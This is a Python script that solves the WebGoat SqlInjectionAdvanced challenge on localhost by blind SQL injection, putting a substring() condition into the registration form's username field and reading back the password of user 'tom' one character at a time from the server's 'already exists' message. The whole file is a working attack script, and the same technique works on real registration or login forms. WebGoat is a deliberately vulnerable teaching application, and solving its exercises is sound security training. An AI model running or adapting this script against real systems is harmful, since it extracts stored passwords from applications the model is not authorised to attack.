import json  
import requests  
def find_password():  
    char_index = 0  
    all_chars = 'abcdefghijklmnopqrstuvwxyz'  
    pass_char_index = 1  
    guessed_password = ''    
    request_headers = {  
        'Cookie': 'JSESSIONID=qcFstFrpPb1Lujrwjxq6j9J4tjdaS87He0UWJYfN',  
    }  
    while True:  
        sql_injection = 'tom\' AND substring(password,{},1)=\'{}'.format(pass_char_index, all_chars[char_index]) 
        request_data = {  
            'username_reg': sql_injection,  
            'email_reg': 'kvdr@gmail.com',  
            'password_reg': '000',  
            'confirm_password_reg': '000'  
        }  
        response = requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=request_headers, data=request_data)  
        try:  
            parsed_response = json.loads(response.text)  
        except:  
            print("Incorrect JSESSIONID. Find it by examining your requests once logged in.")  
            return  
        if "already exists please try to register with a different username" in parsed_response['feedback']:  
            guessed_password += all_chars[char_index]  
            print(guessed_password)  
            char_index = 0  
            pass_char_index += 1 
        else:
            char_index += 1  
            if char_index > len(all_chars) - 1:  
                return    
find_password()
